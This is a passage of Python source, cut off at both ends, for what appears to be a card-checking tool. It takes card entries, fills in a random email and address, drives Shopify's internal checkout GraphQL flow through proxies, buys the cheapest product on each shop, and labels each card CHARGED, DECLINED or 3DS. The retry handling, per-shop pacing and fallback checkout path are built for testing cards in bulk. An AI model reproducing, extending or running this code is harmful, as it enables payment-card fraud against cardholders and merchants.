    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    resp = await client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token,
                                  session_token, build_id, source_token),
    )
    return resp.status_code, resp.text


# ── Step 5: Proposal 2 (email) ────────────────────────────────────────

async def send_proposal2(client: AsyncTLSClient, shop_url: str, checkout_url: str,
                         checkout_token: str, session_token: str, stable_id: str,
                         variant_id: str, price: str, proposal_id: str,
                         build_id: str, source_token: str, queue_token: str,
                         email: str, currency: str, country: str):
    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": "{queue_token}",
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "", "city": "", "countryCode": "US",
            "lastName": "", "phone": "", "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": ""}}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "email": "{email}",
      "emailChanged": true,
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    resp = await client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token,
                                  session_token, build_id, source_token),
    )
    return resp.status_code, resp.text


# ── Step 6/7/8: Proposal 3 (address) ─────────────────────────────────

async def send_proposal3(client: AsyncTLSClient, shop_url: str, checkout_url: str,
                         checkout_token: str, session_token: str, stable_id: str,
                         variant_id: str, price: str, proposal_id: str,
                         build_id: str, source_token: str, queue_token: str,
                         email: str, addr: Address, currency: str, country: str):
    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": "{queue_token}",
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}",
            "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{
          "address1": "{addr.address1}",
          "address2": "{addr.address2}",
          "city": "{addr.city}",
          "countryCode": "{addr.country_code}",
          "postalCode": "{addr.postal_code}",
          "firstName": "{addr.first_name}",
          "lastName": "{addr.last_name}",
          "zoneCode": "{addr.zone_code}",
          "phone": "{addr.phone}"
        }}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "email": "{email}",
      "emailChanged": false,
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    resp = await client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token,
                                  session_token, build_id, source_token),
    )
    return resp.status_code, resp.text


# ── Step 10a: poll for receipt ────────────────────────────────────────

async def send_poll_for_receipt(client: AsyncTLSClient, shop_url: str, checkout_url: str,
                                checkout_token: str, session_token: str, build_id: str,
                                source_token: str, poll_id: str, receipt_id: str,
                                receipt_session_token: str):
    params   = {
        "operationName": "PollForReceipt",
        "variables":     json.dumps({"receiptId": receipt_id,
                                     "sessionToken": receipt_session_token}),
        "id":            poll_id,
    }
    full_url = f"{shop_url}/checkouts/internal/graphql/persisted?{urllib.parse.urlencode(params)}"
    headers  = _proposal_headers(shop_url, checkout_url, checkout_token,
                                 session_token, build_id, source_token)
    headers["x-checkout-web-source-id"] = checkout_token
    resp = await client.get(full_url, headers=headers)
    return resp.status_code, resp.text


# ── Step 10b: submit for completion ──────────────────────────────────

async def send_submit_for_completion(client: AsyncTLSClient, shop_url: str,
                                     checkout_url: str, checkout_token: str,
                                     session_token: str, stable_id: str, variant_id: str,
                                     price: str, submit_id: str, build_id: str,
                                     source_token: str, queue_token: str, email: str,
                                     addr: Address, delivery_handle: str, shipping_amount: str,
                                     total_amount: str, pci_session_id: str, attempt_token: str,
                                     currency: str, country: str, signed_handles,
                                     is_digital: bool = False, tax_amount: str = None,
                                     total_any: bool = False,
                                     payment_flexibility_terms_id: str = "") -> tuple:
    handle_lines        = [json.dumps({"signedHandle": h}) for h in (signed_handles or [])]
    signed_handles_json = "[" + ",".join(handle_lines) + "]"
    page_id             = generate_page_id()

    flex_line = ""
    if payment_flexibility_terms_id:
        flex_line = (',\n        "paymentFlexibilityTermsId": "'
                     + payment_flexibility_terms_id + '"')

    if is_digital or total_any:
        total_amount_block = '"totalAmount": {"any": true}'
    else:
        total_amount_block = f'"totalAmount": {{"value": {{"amount": "{total_amount}", "currencyCode": "USD"}}}}'

    if is_digital or total_any:
        amount_line = '"amount": {"any": true}'
    else:
        amount_line = f'"amount": {{"value": {{"amount": "{total_amount}", "currencyCode": "USD"}}}}'

    if is_digital:
        delivery_block = f'''
      "delivery": {{
        "deliveryLines": [{{
          "selectedDeliveryStrategy": {{
            "deliveryStrategyMatchingConditions": {{
              "estimatedTimeInTransit": {{"any": true}},
              "shipments": {{"any": true}}
            }},
            "options": {{}}
          }},
          "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
          "deliveryMethodTypes": ["NONE"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": true
        }}],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{"deliveryExpectationLines": []}}'''
    else:
        delivery_block = f'''
      "delivery": {{
        "deliveryLines": [{{
          "destination": {{
            "streetAddress": {{
              "address1": "{addr.address1}",
              "address2": "{addr.address2}",
              "city": "{addr.city}",
              "countryCode": "{addr.country_code}",
              "postalCode": "{addr.postal_code}",
              "firstName": "{addr.first_name}",
              "lastName": "{addr.last_name}",
              "zoneCode": "{addr.zone_code}",
              "phone": "{addr.phone}",
              "oneTimeUse": false
            }}
          }},
          "selectedDeliveryStrategy": {{
            "deliveryStrategyByHandle": {{
              "handle": "{delivery_handle}",
              "customDeliveryRate": false
            }},
            "options": {{}}
          }},
          "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
          "deliveryMethodTypes": ["SHIPPING"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": false
        }}],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{"deliveryExpectationLines": {signed_handles_json}}}'''

    tax_val   = tax_amount or "0.0"
    tax_block = f'"proposedTotalAmount": {{"value": {{"amount": "{tax_val}", "currencyCode": "USD"}}}}'

    gql_payload = f'''{{
  "variables": {{
    "input": {{
      "sessionInput": {{"sessionToken": "{session_token}"}},
      "queueToken": "{queue_token}",
      "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
      {delivery_block},
      "merchandise": {{
        "merchandiseLines": [{{
          "stableId": "{stable_id}",
          "merchandise": {{
            "productVariantReference": {{
              "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
              "variantId": "gid://shopify/ProductVariant/{variant_id}",
              "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
            }}
          }},
          "quantity": {{"items": {{"value": 1}}}},
          "expectedTotalPrice": {{"any": true}},
          "lineComponentsSource": null, "lineComponents": []
        }}]
      }},
      "memberships": {{"memberships": []}},
      "payment": {{
        {total_amount_block},
        "paymentLines": [{{
          "paymentMethod": {{
            "directPaymentMethod": {{
              "sessionId": "{pci_session_id}",
              "billingAddress": {{
                "streetAddress": {{
                  "address1": "{addr.address1}",
                  "address2": "{addr.address2}",
                  "city": "{addr.city}",
                  "countryCode": "{addr.country_code}",
                  "postalCode": "{addr.postal_code}",
                  "firstName": "{addr.first_name}",
                  "lastName": "{addr.last_name}",
                  "zoneCode": "{addr.zone_code}",
                  "phone": "{addr.phone}"
                }}
              }},
              "cardSource": null
            }},
            "giftCardPaymentMethod": null,
            "redeemablePaymentMethod": null,
            "walletPaymentMethod": null,
            "walletsPlatformPaymentMethod": null,
            "localPaymentMethod": null,
            "paymentOnDeliveryMethod": null,
            "paymentOnDeliveryMethod2": null,
            "manualPaymentMethod": null,
            "customPaymentMethod": null,
            "offsitePaymentMethod": null,
            "customOnsitePaymentMethod": null,
            "deferredPaymentMethod": null,
            "customerCreditCardPaymentMethod": null,
            "paypalBillingAgreementPaymentMethod": null,
            "remotePaymentInstrument": null
          }},
          {amount_line}
        }}],
        "billingAddress": {{
          "streetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}"
          }}
        }}{flex_line}
      }},
      "buyerIdentity": {{
        "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
        "email": "{email}",
        "emailChanged": false,
        "phoneCountryCode": "US",
        "marketingConsent": [],
        "shopPayOptInPhone": {{"countryCode": "US"}},
        "rememberMe": false
      }},
      "tip": {{"tipLines": []}},
      "poNumber": null,
      "taxes": {{
        "proposedAllocations": null,
        {tax_block},
        "proposedTotalIncludedAmount": null,
        "proposedMixedStateTotalAmount": null,
        "proposedExemptions": []
      }},
      "note": {{"message": null, "customAttributes": []}},
      "localizationExtension": {{"fields": []}},
      "nonNegotiableTerms": null,
      "scriptFingerprint": {{
        "signature": null, "signatureUuid": null,
        "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
      }},
      "optionalDuties": {{"buyerRefusesDuties": false}},
      "cartMetafields": []
    }},
    "attemptToken": "{attempt_token}",
    "metafields": [],
    "analytics": {{
      "requestUrl": "{checkout_url}",
      "pageId": "{page_id}"
    }}
  }},
  "operationName": "SubmitForCompletion",
  "id": "{submit_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    resp = await client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token,
                                  session_token, build_id, source_token),
    )
    return resp.status_code, resp.text


# ── Main async checkout orchestrator ─────────────────────────────────

async def _persisted_checkout_for_card_async(shop_url: str, card_entry: str,
                                              proxy_url: str = "") -> CheckResult:
    currency  = "USD"
    country   = "US"
    site_name = shop_url.replace("https://", "").replace("http://", "")

    result = CheckResult(card=card_entry, shop_url=shop_url,
                         site_name=site_name, currency=currency,
                         proxy=proxy_url,
                         status=CheckStatus.ERROR)
    try:
        card_number, card_month, card_year, card_cvv = parse_card_entry(card_entry)
    except Exception as e:
        result.error = e
        return result

    email       = generate_random_email()

    client = AsyncTLSClient(timeout=12, proxy_url=proxy_url)
    try:
        currency, country = await fetch_shop_currency(client, shop_url)
        result.currency = currency

        try:
            title, product_id, product_handle, variant_id, price = await find_cheapest_product(
                client, shop_url
            )
            _ = title
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 0 failed: {e}")
            return result

        try:
            checkout_url, checkout_token, session_token, checkout_html = \
                await add_to_cart_and_checkout(client, shop_url, variant_id, product_id, product_handle)
            stable_id    = extract_stable_id(checkout_html)
            build_id     = extract_commit_sha(checkout_html)
            source_token = extract_source_token(checkout_html)
            if not stable_id or not build_id or not source_token:
                raise Exception("missing stableId, buildId, or sourceToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = "CF_MANAGED_CHALLENGE" not in str(e)
            result.error = Exception(f"Step 1 failed: {e}")
            return result

        try:
            pat_id = extract_private_access_token_id(checkout_html)
            if not pat_id:
                raise Exception("could not extract private_access_token id")
            await fetch_private_access_token(client, shop_url, checkout_url, pat_id)
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 2 failed: {e}")
            return result

        try:
            ops = await discover_persisted_ids(client, checkout_html, shop_url, build_id)
            proposal_id         = ops.get("Proposal", "")
            submit_id           = ops.get("SubmitForCompletion", "")
            poll_for_receipt_id = ops.get("PollForReceipt", "")
            if not proposal_id or not submit_id:
                raise Exception("missing Proposal or Submit ID")
            if not poll_for_receipt_id:
                _log.warning("PollForReceipt id not found for %s (build %s); "
                             "Step 11 polling will fail", shop_url, build_id)
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 3 failed: {e}")
            return result

        try:
            _, proposal_body = await send_proposal(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                currency, country)
            cur = extract_seller_currency(proposal_body)
            if cur and cur != currency:
                currency = cur
            ctr = extract_seller_country(proposal_body)
            if ctr and ctr != country:
                country = ctr
            result.currency = currency
            if not result.gateway:
                result.gateway = extract_gateway_name(proposal_body)
            if currency == "USD":
                sp = extract_seller_merchandise_price(proposal_body)
                if sp and sp != price:
                    price = sp
            queue_token = extract_queue_token(proposal_body)
            if not queue_token:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 4 failed: {e}")
            return result

        try:
            _, proposal2_body = await send_proposal2(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                queue_token, email, currency, country)
            queue_token2 = extract_queue_token(proposal2_body)
            if not queue_token2:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 5 failed: {e}")
            return result

        try:
            addr = address_for_country(country)
            _, proposal3_body = await send_proposal3(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                queue_token2, email, addr, currency, country)
            queue_token3 = extract_queue_token(proposal3_body)
            if not queue_token3:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 6 failed: {e}")
            return result

        try:
            _, proposal4_body = await send_proposal3(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                queue_token3, email, addr, currency, country)
            queue_token4 = extract_queue_token(proposal4_body)
            if not queue_token4:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 7 failed: {e}")
            return result

        try:
            proposal5_status, proposal5_body = await send_proposal3(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                queue_token4, email, addr, currency, country)
            _ = proposal5_status
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 8 failed: {e}")
            return result

        try:
            ident_sig = extract_identification_signature(checkout_html)
            if not ident_sig:
                raise Exception("could not extract identification signature")
            pci_status, pci_body = await send_pci_session(
                ident_sig, card_number,
                f"{addr.first_name} {addr.last_name}",
                card_month, card_year, card_cvv, site_name, proxy_url)

            pci_session_id = extract_pci_session_id(pci_body)
            if not pci_session_id:
                verdict = classify_pci_rejection(pci_status, pci_body)
                if verdict == "invalid_cvc":
                    result.retryable = False
                    result.status = CheckStatus.DECLINED
                    result.error = Exception(
                        f"CVV rejected for this card type (HTTP {pci_status}): "
                        f"{_pci_error_reason(pci_body)}")
                    return result
                if verdict == "card_declined":
                    result.retryable = False
                    result.status = CheckStatus.DECLINED
                    result.error = Exception(
                        f"Card refused at tokenisation (HTTP {pci_status}): "
                        f"{_pci_error_reason(pci_body)}")
                    return result
                if verdict == "pci_error":
                    result.retryable = False
                    result.status = CheckStatus.ERROR
                    result.error = Exception(
                        f"PCI tokenisation refused the card data (HTTP {pci_status}): "
                        f"{_pci_error_reason(pci_body)}")
                    return result
                result.retryable = True
                raise Exception(
                    f"could not extract session ID (HTTP {pci_status}): "
                    f"{_pci_error_reason(pci_body)}")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 9 failed: {e}")
            return result

        try:
            queue_token5 = extract_queue_token(proposal5_body)
            if not queue_token5:
                raise Exception("could not extract queueToken")

            is_digital      = not extract_is_shipping_required(proposal5_body)
            delivery_handle, shipping_amount, needs_delivery = resolve_delivery(proposal5_body)
            if not delivery_handle and needs_delivery:
                result.retryable = True
                raise Exception("Step 10 failed: could not extract delivery handle")

            signed_handles = extract_signed_handles(proposal5_body)

            total_amount = extract_checkout_total(proposal5_body)
            if not total_amount:
                total_amount = extract_seller_total(proposal5_body)
            if not total_amount:
                total_amount = extract_running_total(proposal5_body)
            if not total_amount:
                raise Exception("Step 10 failed: could not extract total amount")
            result.amount = total_amount

            flex_terms_id = extract_payment_flexibility_terms_id(proposal5_body)
            if flex_terms_id:
                _log.info("payment flexibility terms present: id=%s type=%s",
                          flex_terms_id[:16], extract_payment_flexibility_terms_type(proposal5_body))

            attempt_token = generate_attempt_token(checkout_token)
            current_tax   = extract_tax_amount(proposal5_body)
            current_total = total_amount
            cover_any     = False

            for tax_attempt in range(1, 6):
                submit_status, submit_body = await send_submit_for_completion(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, submit_id, build_id, source_token,
                    queue_token5, email, addr, delivery_handle, shipping_amount,
                    current_total, pci_session_id, attempt_token, currency, country,
                    signed_handles, is_digital=is_digital, tax_amount=current_tax,
                    total_any=cover_any,
                    payment_flexibility_terms_id=flex_terms_id)

                # 3DS is terminal.
                if ('"AUTHENTICATION_REQUIRED"' in submit_body
                        or '"3DS_REQUIRED"' in submit_body
                        or '"challengeType"' in submit_body
                        or '"CompletePaymentChallenge"' in submit_body):
                    result.status      = CheckStatus.THREE_DS
                    result.status_code = "3DS_REQUIRED"
                    return result

                if ('"AUTHENTICATION_ERROR"' in submit_body
                        or '"AUTHENTICATION_FAILED"' in submit_body
                        or '"3DS_FAILED"' in submit_body):
                    result.status      = CheckStatus.DECLINED
                    result.status_code = "3DS_FAILED"
                    result.error       = Exception("3DS_FAILED")
                    result.retryable   = False
                    return result

                if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in submit_body:
                    new_tax   = extract_tax_from_rejected(submit_body)
                    new_total = extract_total_from_rejected(submit_body)
                    if new_tax:
                        current_tax = new_tax
                    if new_total:
                        current_total = new_total
                    await asyncio.sleep(0.05)
                    continue

                if ("WAITING_PENDING_TERMS" in submit_body
                        or "Waiting for pending terms" in submit_body):
                    corr_total, corr_tax = extract_rejected_totals(submit_body)
                    if corr_total and float(corr_total) > 0:
                        current_total = corr_total
                    if corr_tax:
                        current_tax = corr_tax
                    dh, dh_ship = extract_delivery_from_proposal(submit_body)
                    if dh:
                        delivery_handle = dh
                        if dh_ship:
                            shipping_amount = dh_ship
                    signed2 = extract_signed_handles(submit_body)
                    if signed2:
                        signed_handles = signed2
                    await asyncio.sleep(extract_pending_poll_delay(submit_body))
                    continue

                if "cannot cover the total amount" in submit_body and not cover_any:
                    corrected_total, corrected_tax = extract_rejected_totals(submit_body)
                    if corrected_total and float(corrected_total) > 0:
                        current_total = corrected_total
                        if corrected_tax:
                            current_tax = corrected_tax
                    else:
                        cover_any = True
                    await asyncio.sleep(0.05)
                    continue

                if "PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH" in submit_body.replace(" ", "_").upper() \
                        or "PAYMENT FLEXIBILITY TERMS ID MISMATCH" in submit_body:
                    new_id = extract_payment_flexibility_terms_id(submit_body)
                    if not new_id:
                        new_id = extract_payment_flexibility_terms_id(proposal5_body)
                    if new_id and new_id != flex_terms_id:
                        flex_terms_id = new_id
                        _log.info("retrying submit with paymentFlexibilityTermsId=%s (%s)",
                                  new_id[:16], extract_payment_flexibility_terms_type(submit_body))
                        await asyncio.sleep(0.05)
                        continue
                break

            _ = submit_status
            check_submit_errors(submit_status, submit_body)

            receipt_id = extract_receipt_id(submit_body)
            if not receipt_id:
                raw = extract_any_error(submit_body)
                if raw:
                    error_msg = normalize_card_result(raw)
                else:
                    error_msg, retry = no_code_failure(submit_body)
                    _log.warning("submit returned no receipt id and no code "
                                 "(%s); reporting %s",
                                 submit_body_reports_success(submit_body), error_msg)
                    result.status      = CheckStatus.ERROR
                    result.status_code = error_msg
                    result.error       = Exception(error_msg)
                    result.retryable   = retry
                    return result

                if error_msg == "3DS_REQUIRED":
                    result.status      = CheckStatus.THREE_DS
                    result.status_code = "3DS_REQUIRED"
                    result.retryable   = False
                    return result
                if error_msg == "3DS_FAILED":
                    result.status      = CheckStatus.DECLINED
                    result.status_code = "3DS_FAILED"
                    result.error       = Exception("3DS_FAILED")
                    result.retryable   = False
                    return result

                result.status = result_status_for(error_msg)
                result.status_code = error_msg
                result.error = Exception(error_msg)
                result.retryable = (error_msg in ("GENERIC_ERROR", "CHECKOUT_RETRYABLE")
                                    or any(k in error_msg.lower()
                                           for k in ['inventory', 'retry', 'try again']))
                return result

            receipt_session_token = extract_receipt_session_token(submit_body)
            if not receipt_session_token:
                raise Exception("Step 10 failed: could not extract sessionToken")
            if not result.gateway:
                result.gateway = extract_gateway_name(proposal5_body, submit_body)
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error  = e
            return result

        # Step 11 — poll for receipt
        poll_delay_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
        type_name_re  = re.compile(r'"__typename"\s*:\s*"([A-Za-z_]*Receipt[A-Za-z_]*)"')
        max_polls = 30
        seen_rounds = 0
        max_patient_rounds = 120
        patient_rounds = 0

        while seen_rounds < max_polls:
            try:
                _, poll_body = await send_poll_for_receipt(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    build_id, source_token, poll_for_receipt_id,
                    receipt_id, receipt_session_token)

                receipt_type = ""
                m = type_name_re.search(poll_body)
                if m:
                    receipt_type = m.group(1)

                outcome = classify_receipt(poll_body, receipt_type)
                result.status_code = extract_receipt_status_code(poll_body, receipt_type)

                if outcome == "three_ds_required":
                    result.status      = CheckStatus.THREE_DS
                    result.status_code = "3DS_REQUIRED"
                    result.retryable   = False
                    return result

                if outcome == "three_ds_failed":
                    result.status      = CheckStatus.DECLINED
                    result.status_code = "3DS_FAILED"
                    result.error       = Exception("3DS_FAILED")
                    result.retryable   = False
                    return result

                if outcome == "success":
                    result.status      = CheckStatus.CHARGED
                    result.status_code = "ORDER_PAID"
                    result.receipt_url = checkout_url + "/thank_you"
                    return result

                if outcome == "failure":
                    em = re.search(r'"code"\s*:\s*"([^"]+)"', poll_body)
                    if em:
                        error_code = normalize_card_result(em.group(1))
                        if error_code == "FAILED":
                            error_code = "GENERIC_ERROR"
                    else:
                        error_code = "UNKNOWN_ERROR"
                        raw_msg = extract_any_error(poll_body)
                        if raw_msg:
                            error_code = f"UNKNOWN_ERROR: {raw_msg[:80]}"

                    if error_code == "3DS_REQUIRED":
                        result.status      = CheckStatus.THREE_DS
                        result.status_code = "3DS_REQUIRED"
                        result.retryable   = False
                        return result
                    if error_code == "3DS_FAILED":
                        result.status      = CheckStatus.DECLINED
                        result.status_code = "3DS_FAILED"
                        result.error       = Exception("3DS_FAILED")
                        result.retryable   = False
                        return result

                    result.status = result_status_for(error_code)
                    result.status_code = error_code
                    result.error = Exception(error_code)
                    result.retryable = (error_code in ("GENERIC_ERROR", "CHECKOUT_RETRYABLE")
                                        or error_code == "01003"
                                        or "InventoryReservationFailure" in poll_body)
                    return result

                if outcome in ("pending", "retryable"):
                    patient_rounds += 1
                else:
                    seen_rounds += 1

                if patient_rounds > max_patient_rounds:
                    break

                delay = 500
                m2 = poll_delay_re.search(poll_body)
                if m2:
                    try:
                        d = int(m2.group(1))
                        if d > 0:
                            delay = d
                    except ValueError:
                        pass
                if outcome == "retryable":
                    delay = max(delay, 400)
                await asyncio.sleep(min(delay, 150) / 1000.0)

            except Exception as e:
                result.status = CheckStatus.ERROR
                result.error  = Exception(f"poll {seen_rounds + 1} failed: {e}")
                return result

        result.status      = CheckStatus.ERROR
        result.status_code = "POLL_TIMEOUT"
        result.error       = Exception("receipt not confirmed within poll budget")
        result.retryable   = True
        return result

    finally:
        await client.close()


# ──────────────────────── Pacing & cascade (c3.py parity) ───────────

_SHOP_PACE: dict = {}


async def _pace_async(shop_url: str):
    now = _time.time()
    last = _SHOP_PACE.get(shop_url, 0)
    wait = 0.9 - (now - last)
    if wait > 0:
        await asyncio.sleep(wait)
    _SHOP_PACE[shop_url] = _time.time()


async def legacy_checkout_async(shop_url: str, card_entry: str,
                                proxy_url: str = "") -> CheckResult:
    site_name = shop_url.replace("https://", "").replace("http://", "").split("/")[0]
    result = CheckResult(card=card_entry, shop_url=shop_url, site_name=site_name,
                         currency="USD", proxy=proxy_url, status=CheckStatus.ERROR)
    try:
        number, month, year, cvv = parse_card_entry(card_entry)
    except Exception as e:
        result.error = e
        return result

    proxy_url = normalize_proxy(proxy_url) if (proxy_url or "").strip() else ""
    email = generate_random_email()
    addr = address_for_country("US")
    full_name = f"{addr.first_name} {addr.last_name}".title()

    client = AsyncTLSClient(timeout=12, proxy_url=proxy_url)
    try:
        try:
            _title, _pid, _handle, variant_id, _price = await find_cheapest_product(client, shop_url)
        except Exception as e:
            result.error = Exception(f"legacy discovery: {e}")
            return result

        r1 = await client.post(f"{shop_url}/cart/add.js",
                               data={"id": variant_id, "quantity": 1},
                               headers={"x-requested-with": "XMLHttpRequest",
